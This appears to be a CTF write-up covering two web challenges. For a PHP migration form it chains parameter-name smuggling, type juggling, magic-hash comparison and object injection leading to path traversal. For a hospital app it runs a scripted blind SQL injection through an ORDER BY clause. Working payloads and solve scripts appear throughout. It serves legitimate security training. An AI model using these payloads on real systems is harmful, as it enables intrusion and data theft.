---
layout: post
title:  "Web Challenges"
date:   2026-10-12 12:40:00 -0400
author: uzi
tags: [CTF]
permalink: /fortid-ctf-2026-web/
---
* TOC
{:toc}

## Ultimative PHP

**Author**: dsantl

**Category**: web

**Description**: The Ultimative Corporation is retiring its legacy identity platform. One final all-in-one migration form verifies administrator access, recovery answers, a dual-format migration code, and an exported PHP profile.

The developers insist that every individual check is secure. Complete the migration and recover the flag.

I get the challenge files:
```shell
unzip handout.zip  
Archive:  handout.zip  
  inflating: ultimative_php/src/index.php  
  inflating: ultimative_php/src/style.css  
  inflating: ultimative_php/src/manual/operations.php  
  inflating: ultimative_php/src/templates/welcome.txt  
  inflating: ultimative_php/deploy/Dockerfile  
  inflating: ultimative_php/deploy/challenge.ini  
  inflating: ultimative_php/deploy/entrypoint.sh  
  inflating: ultimative_php/.dockerignore  
  inflating: ultimative_php/flag.txt  
  inflating: ultimative_php/README.md
```

Contents of `index.php`:
```php
<?php

declare(strict_types=1);

final class MigratedProfile
{
    public $displayName = 'guest';

    public function __toString(): string
    {
        return (string) $this->displayName;
    }
}

final class LegacyTemplate
{
    public $template = 'welcome.txt';

    public function __toString(): string
    {
        if (strpos($this->template, '../')) {
            return '[invalid template]';
        }

        $path = __DIR__ . '/templates/' . $this->template;
        $contents = file_get_contents($path);

        return $contents === false ? '[missing template]' : $contents;
    }
}

function page_start(string $title): void
{
    $safeTitle = htmlspecialchars($title, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    echo '<!doctype html><html lang="en"><head><meta charset="utf-8">';
    echo '<meta name="viewport" content="width=device-width,initial-scale=1">';
    echo "<title>{$safeTitle}</title><link rel=\"stylesheet\" href=\"/style.css\">";
    echo '</head><body><main>';
}

function page_end(): void
{
    echo '</main></body></html>';
}

function fail_request(string $message, array $details = []): never
{
    http_response_code(403);
    page_start('Migration rejected');
    echo '<section class="result"><p class="eyebrow">Verification failure</p>';
    echo '<h2>Migration rejected</h2>';
    echo '<p class="error">' . htmlspecialchars($message, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</p>';

    foreach ($details as $label => $value) {
        echo '<p><code>' . htmlspecialchars((string) $label, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
        echo ': ' . htmlspecialchars((string) $value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</code></p>';
    }

    echo '<a class="button secondary" href="/">Start over</a></section>';
    page_end();
    exit;
}

function decode_base64url(string $input): string|false
{
    $input = strtr($input, '-_', '+/');
    $remainder = strlen($input) % 4;

    if ($remainder === 1) {
        return false;
    }

    if ($remainder !== 0) {
        $input .= str_repeat('=', 4 - $remainder);
    }

    return base64_decode($input, true);
}

if (isset($_GET['manual'])) {
    $manual = $_GET['manual'];

    if (!is_string($manual)) {
        fail_request('Invalid manual name');
    }

    if (str_contains($manual, 'php://') || str_contains($manual, '../')) {
        fail_request('Invalid manual name');
    }

    $manual = rawurldecode($manual);

    if (!str_ends_with($manual, '.php')) {
        fail_request('Only PHP manual pages can be loaded');
    }

    page_start('Operations manual');
    include $manual;
    page_end();
    exit;
}

if ($_GET === []) {
    page_start('Ultimative PHP migration');
    ?>
    <section class="shell">
        <p class="eyebrow">Ultimative Identity Platform · final migration</p>
        <h1>One request.<br>Zero exceptions.</h1>
        <p class="lead">
            Submit every legacy proof together. The gateway rejects partial
            migrations and preserves no state between attempts.
        </p>
        <div class="status-grid">
            <div><span>Legacy digest</span><strong>MD5 compatibility</strong></div>
            <div><span>Modern digest</span><strong>SHA-256 enabled</strong></div>
            <div><span>Profile format</span><strong>PHP portable object</strong></div>
            <div><span>Gateway mode</span><strong>Strict verification</strong></div>
        </div>
        <a class="button" href="/?manual=manual/operations.php">Read operations manual</a>
    </section>
    <?php
    page_end();
    exit;
}

$rawQuery = $_SERVER['QUERY_STRING'] ?? '';

if (str_contains(rawurldecode($rawQuery), 'access_level')) {
    fail_request('The access_level parameter is protected');
}

if (($_GET['access_level'] ?? '') !== 'administrator') {
    fail_request('Administrator access required');
}

$primary = $_GET['primary'] ?? null;
$backup = $_GET['backup'] ?? null;

if ($primary === null || $backup === null) {
    fail_request('Both recovery answers are required');
}

if (get_debug_type($primary) !== get_debug_type($backup)) {
    fail_request('Recovery answers must use the same format');
}

if ($primary === $backup) {
    fail_request('Recovery answers must be different');
}

$primaryMaterial = 'legacy-recovery:v1:' . $primary;
$backupMaterial = 'legacy-recovery:v1:' . $backup;

$primaryHash = hash('sha256', $primaryMaterial);
$backupHash = hash('sha256', $backupMaterial);

if (!hash_equals($primaryHash, $backupHash)) {
    fail_request('Recovery fingerprints do not match');
}

$code = $_GET['code'] ?? '';

if (!is_string($code) || strlen($code) > 64) {
    fail_request('Invalid migration code');
}

$material = 'ULTIMATIVE-PHP-2026:' . $code;
$legacyDigest = substr(hash('md5', $material), 0, 9);
$modernDigest = substr(hash('sha256', $material), 0, 9);

if (!($legacyDigest !== $modernDigest && $legacyDigest == $modernDigest)) {
    fail_request('The compatibility code was rejected', [
        'legacy' => $legacyDigest,
        'modern' => $modernDigest,
    ]);
}

$encodedProfile = $_GET['profile'] ?? '';

if (!is_string($encodedProfile)) {
    fail_request('Invalid profile encoding');
}

$serializedProfile = decode_base64url($encodedProfile);

if ($serializedProfile === false) {
    fail_request('Invalid profile encoding');
}

$profile = @unserialize($serializedProfile, [
    'allowed_classes' => [MigratedProfile::class, LegacyTemplate::class],
]);

if (!$profile instanceof MigratedProfile) {
    fail_request('Unsupported profile type');
}

page_start('Migration completed');
echo '<section class="result"><p class="eyebrow">Verification complete</p>';
echo '<h2>Profile imported</h2><p class="lead">Welcome to the modern identity platform.</p>';
echo '<p class="flag">' . htmlspecialchars((string) $profile, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</p>';
echo '</section>';
page_end();
```

There are four validation mistakes in `index.php`. 

The first one is the `access_level` bypass via dot to underscore. PHP converts dots in query parameter names to underscores. 
```php
$rawQuery = $_SERVER['QUERY_STRING'] ?? '';

if (str_contains(rawurldecode($rawQuery), 'access_level')) {
    fail_request('The access_level parameter is protected');
}

if (($_GET['access_level'] ?? '') !== 'administrator') {
    fail_request('Administrator access required');
}
```
By sending `access.level=administrator` the raw query contains `access.level` not `access_level` and passes the first check. PHP sets `$_GET['access_level'] = 'administrator'` and passes the second check.

The second mistake is allowing the recovery answers to become arrays:
```php
$primary = $_GET['primary'] ?? null;
$backup = $_GET['backup'] ?? null;

if ($primary === null || $backup === null) {
    fail_request('Both recovery answers are required');
}

if (get_debug_type($primary) !== get_debug_type($backup)) {
    fail_request('Recovery answers must use the same format');
}

if ($primary === $backup) {
    fail_request('Recovery answers must be different');
}

$primaryMaterial = 'legacy-recovery:v1:' . $primary;
$backupMaterial = 'legacy-recovery:v1:' . $backup;

$primaryHash = hash('sha256', $primaryMaterial);
$backupHash = hash('sha256', $backupMaterial);

if (!hash_equals($primaryHash, $backupHash)) {
    fail_request('Recovery fingerprints do not match');
}
```
Sending `primary[]=a&backup[]=b`:
- Both are arrays are the same type.
- `$primary === $backup` is false.
- Concatenating an array to a string gives `"Array"` in PHP so both become `'legacy-recovery:v1:Array'`

Three is a loose compatibility code comparison: 
```php
$material = 'ULTIMATIVE-PHP-2026:' . $code;
$legacyDigest = substr(hash('md5', $material), 0, 9);
$modernDigest = substr(hash('sha256', $material), 0, 9);

if (!($legacyDigest !== $modernDigest && $legacyDigest == $modernDigest)) {
    fail_request('The compatibility code was rejected', [
        'legacy' => $legacyDigest,
        'modern' => $modernDigest,
    ]);
}
```
I need a `code` where the first 9 chars of MD5 and sha-256 are both `0e\d{7}` but different strings.

PHPs `==` treats `0e1234567` and `0e7654321` as the number `0`. `!==` sees different strings so the whole condition passes.

The fourth mistake is PHP object injection leading to path traversal:
```php
$profile = @unserialize($serializedProfile, [
    'allowed_classes' => [MigratedProfile::class, LegacyTemplate::class],
]);

if (!$profile instanceof MigratedProfile) {
    fail_request('Unsupported profile type');
}

page_start('Migration completed');
echo '<section class="result"><p class="eyebrow">Verification complete</p>';
echo '<h2>Profile imported</h2><p class="lead">Welcome to the modern identity platform.</p>';
echo '<p class="flag">' . htmlspecialchars((string) $profile, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</p>';
```
`MigratedProfile::__toString()`:
```php
public function __toString(): string
{
    return (string) $this->displayName;
}
```
`LegacyTemplate::__toString()`:
```php
public function __toString(): string
{
    if (strpos($this->template, '../')) {
        return '[invalid template]';
    }
    
    $path = __DIR__ . '/templates/' . $this->template;
    $contents = file_get_contents($path);

    return $contents === false ? '[missing template]' : $contents;
}
```
`strpos($this->template, '../')` returns `0` if the string starts with `../`. `if (0)` is false and the check is bypassed. 

Serialized payload:
```shell
O:15:"MigratedProfile":1:{s:11:"displayName";O:14:"LegacyTemplate":1:{s:8:"template";s:16:"../../../../flag";}}
```
Base64 url encode that for `profile`.

I ran this to generate my final exploit url:
```python
import hashlib, re, base64, urllib.parse  
 
PREFIX = "ULTIMATIVE-PHP-2026:"  
for i in range(200_000_000):  
    c = str(i)  
    h1 = hashlib.md5((PREFIX+c).encode()).hexdigest()[:9]  
    h2 = hashlib.sha256((PREFIX+c).encode()).hexdigest()[:9]  
    if h1 != h2 and re.fullmatch(r"0e\d{7}", h1) and re.fullmatch(r"0e\d{7}", h2):  
        code = c  
        break  
 
serialized = b'O:15:"MigratedProfile":1:{s:11:"displayName";O:14:"LegacyTemplate":1:{s:8:"template";s:16:"../../../../flag";}}'  
profile = base64.urlsafe_b64encode(serialized).decode().rstrip("=")  
 
params = [  
    ("access.level", "administrator"),  
    ("primary[]", "a"),  
    ("backup[]", "b"),  
    ("code", code),  
    ("profile", profile),  
]  

print(urllib.parse.urlencode(params))
```

Output:
```shell
access.level=administrator&primary%5B%5D=a&backup%5B%5D=b&code=59036305&profile=TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MTY6Ii4uLy4uLy4uLy4uL2ZsYWciO319
```

Going to the site:

![Alt text](/images/fortidweb1.png)

I visit the url:
```shell
https://ultimative-php-5521e87e2eab.inst13.ctf.fortid.com/?access.level=administrator&primary%5B%5D=a&backup%5B%5D=b&code=59036305&profile=TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MTY6Ii4uLy4uLy4uLy4uL2ZsYWciO319
```

![Alt text](/images/fortidweb2.png)

`FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_4debdc5980}`

___

## Doctor Bye Bye

**Author**: dsantl

**Category**: web

**Description**: Dr. Bye Bye has retired from St. Codd's Hospital.

The hospital insists that retired records can never be displayed. Can you recover Dr. Bye Bye's private farewell note anyway?

I get the challenge files:
```shell
unzip handout2.zip  
Archive:  handout2.zip  
  inflating: doctor_bye_bye/src/app.py  
  inflating: doctor_bye_bye/src/templates/index.html  
  inflating: doctor_bye_bye/src/static/style.css  
  inflating: doctor_bye_bye/deploy/Dockerfile  
  inflating: doctor_bye_bye/deploy/entrypoint.sh  
  inflating: doctor_bye_bye/.dockerignore  
  inflating: doctor_bye_bye/README.md  
  inflating: doctor_bye_bye/flag.txt
```

Contents of `app.py`:
```python
#!/usr/bin/env python3
import json
import os
import sqlite3
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlsplit


ROOT = Path(__file__).resolve().parent
DATABASE = Path(os.environ.get("DATABASE_PATH", "/tmp/doctor-bye-bye.db"))
FLAG_FILE = Path(os.environ.get("FLAG_FILE", "/tmp/flag"))
SQLITE_VALUE_LIMIT = 1024 * 1024
SQLITE_SQL_LIMIT = 2048
SQLITE_VM_BUDGET = 50_000


def validate_flag(flag):
    if not (flag.startswith("FortID{") and flag.endswith("}")):
        raise SystemExit("FLAG must use the FortID{...} format")
    if len(flag) > 128:
        raise SystemExit("FLAG must be at most 128 characters")
    if any(ord(character) < 32 or ord(character) > 126 for character in flag):
        raise SystemExit("FLAG must contain printable ASCII characters only")


def load_flag():
    try:
        return FLAG_FILE.read_text()
    finally:
        FLAG_FILE.unlink(missing_ok=True)


def initialize_database(flag):
    DATABASE.unlink(missing_ok=True)
    connection = sqlite3.connect(DATABASE)
    try:
        connection.executescript(
            """
            CREATE TABLE doctors (
                id INTEGER PRIMARY KEY,
                slug TEXT NOT NULL UNIQUE,
                name TEXT NOT NULL,
                specialty TEXT NOT NULL,
                room TEXT NOT NULL,
                listed INTEGER NOT NULL CHECK (listed IN (0, 1)),
                farewell_note TEXT
            );

            INSERT INTO doctors VALUES
                (10, 'ada-pulse', 'Dr. Ada Pulse', 'Cardiology', 'C-101', 1, NULL),
                (30, 'max-well', 'Dr. Max Well', 'Radiology', 'R-204', 1, NULL),
                (50, 'paige-turner', 'Dr. Paige Turner', 'Neurology', 'N-303', 1, NULL),
                (70, 'ella-ment', 'Dr. Ella Ment', 'Pathology', 'P-118', 1, NULL),
                (90, 'zoe-last', 'Dr. Zoe Last', 'Emergency medicine', 'E-001', 1, NULL);
            """,
        )
        connection.execute(
            "INSERT INTO doctors VALUES (?, ?, ?, ?, ?, ?, ?)",
            (404, "doctor-bye-bye", "Dr. Bye Bye", "Retired", "-", 0, flag),
        )
        connection.commit()
    finally:
        connection.close()


def select_on_call(order_expression):
    query = f"""
        SELECT name, specialty, room
        FROM doctors
        WHERE listed = 1
        ORDER BY {order_expression}
        LIMIT 1
    """
    connection = sqlite3.connect(DATABASE)
    try:
        connection.setlimit(sqlite3.SQLITE_LIMIT_LENGTH, SQLITE_VALUE_LIMIT)
        connection.setlimit(sqlite3.SQLITE_LIMIT_SQL_LENGTH, SQLITE_SQL_LIMIT)
        operations_left = SQLITE_VM_BUDGET

        def enforce_budget():
            nonlocal operations_left
            operations_left -= 1_000
            return operations_left <= 0

        connection.set_progress_handler(enforce_budget, 1_000)
        row = connection.execute(query).fetchone()
    finally:
        connection.close()
    if row is None:
        raise LookupError("no on-call doctor")
    return {"name": row[0], "specialty": row[1], "room": row[2]}


class Handler(BaseHTTPRequestHandler):
    server_version = "StCodds/1.0"

    def send_body(self, status, content_type, body):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        request = urlsplit(self.path)
        if request.path == "/":
            body = (ROOT / "templates" / "index.html").read_bytes()
            self.send_body(200, "text/html; charset=utf-8", body)
            return

        if request.path == "/static/style.css":
            body = (ROOT / "static" / "style.css").read_bytes()
            self.send_body(200, "text/css; charset=utf-8", body)
            return

        if request.path == "/api/on-call":
            parameters = parse_qs(request.query, keep_blank_values=True)
            order_expression = parameters.get("sort", ["name"])[0]
            if not order_expression or len(order_expression) > 600:
                self.send_json(400, {"error": "Invalid schedule preference."})
                return
            try:
                doctor = select_on_call(order_expression)
            except (sqlite3.Error, LookupError):
                # Query errors deliberately do not expose database details.
                self.send_json(400, {"error": "The on-call board could not be updated."})
                return
            self.send_json(200, {"doctor": doctor})
            return

        self.send_body(404, "text/plain; charset=utf-8", b"Not found\n")

    def send_json(self, status, value):
        body = json.dumps(value, separators=(",", ":")).encode()
        self.send_body(status, "application/json; charset=utf-8", body)

    def log_message(self, message, *args):
        print(f"{self.address_string()} - {message % args}")


if __name__ == "__main__":
    flag = load_flag()
    validate_flag(flag)
    initialize_database(flag)
    port = int(os.environ.get("PORT", "8080"))
    HTTPServer(("0.0.0.0", port), Handler).serve_forever()
```

They make this query to the database:
```python
query = f"""
    SELECT name, specialty, room
    FROM doctors
    WHERE listed = 1
    ORDER BY {order_expression}
    LIMIT 1
"""
```
As luck would have it we control the input in the `ORDER BY` statement. 

The injection happens in `sort`:
```python
if request.path == "/api/on-call":
    parameters = parse_qs(request.query, keep_blank_values=True)
    order_expression = parameters.get("sort", ["name"])[0]
```

The flag row has `listed = 0` so `WHERE listed = 1` hides it. But a subquery inside `ORDER BY` can still read it. The returned doctor can be used as a boolean oracle:
- If condition true > `ORDER BY id` > returns Dr. Ada Pulse
- If condition false > `ORDER BY -id` > returns Dr. Zoe Last
```python
INSERT INTO doctors VALUES
    (10, 'ada-pulse', 'Dr. Ada Pulse', 'Cardiology', 'C-101', 1, NULL),
    (30, 'max-well', 'Dr. Max Well', 'Radiology', 'R-204', 1, NULL),
    (50, 'paige-turner', 'Dr. Paige Turner', 'Neurology', 'N-303', 1, NULL),
    (70, 'ella-ment', 'Dr. Ella Ment', 'Pathology', 'P-118', 1, NULL),
    (90, 'zoe-last', 'Dr. Zoe Last', 'Emergency medicine', 'E-001', 1, NULL);
"""
```

Then I needed to use a [binary search](https://www.geeksforgeeks.org/python/python-program-for-binary-search/) to extract each character of the flag. 

Going to the site:

![Alt text](/images/fortidweb3.png)

Python script:
```python
import requests

URL = "https://doctor-bye-bye-d4e289bbcd1d.inst8.ctf.fortid.com/api/on-call"

def oracle(pos, mid):
    expr = (
        f"CASE WHEN (SELECT unicode(substr(farewell_note,{pos},1)) "
        f"FROM doctors WHERE id=404) > {mid} THEN id ELSE -id END"
    )
    r = requests.get(URL, params={"sort": expr}, timeout=5)
    r.raise_for_status()
    name = r.json()["doctor"]["name"]
    if name == "Dr. Ada Pulse":
        return True
    if name == "Dr. Zoe Last":
        return False
    raise RuntimeError(f"Unexpected response: {r.text}")

flag = ""
for pos in range(1, 129):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(pos, mid):
            lo = mid + 1
        else:
            hi = mid
    flag += chr(lo)
    print(pos, repr(chr(lo)), flag)

flag = flag[:flag.rfind("}") + 1]
print(flag)
```

Each character extraction sends this injected `sort` value
```sql
CASE WHEN (
  SELECT unicode(substr(farewell_note,p,1))
  FROM doctors
  WHERE id=404
) > m
THEN id
ELSE -id
END
```

Output:
```shell
python3 solve.py  
1 'F' F  
2 'o' Fo  
3 'r' For  
4 't' Fort  
5 'I' FortI  
6 'D' FortID  
7 '{' FortID{

... etc ...

32 'e' FortID{D0C_1M_0UTT4_H3R3_f3924ee  
33 '8' FortID{D0C_1M_0UTT4_H3R3_f3924ee8  
34 '7' FortID{D0C_1M_0UTT4_H3R3_f3924ee87  
35 'd' FortID{D0C_1M_0UTT4_H3R3_f3924ee87d  
36 '}' FortID{D0C_1M_0UTT4_H3R3_f3924ee87d}
```

`FortID{D0C_1M_0UTT4_H3R3_f3924ee87d}`
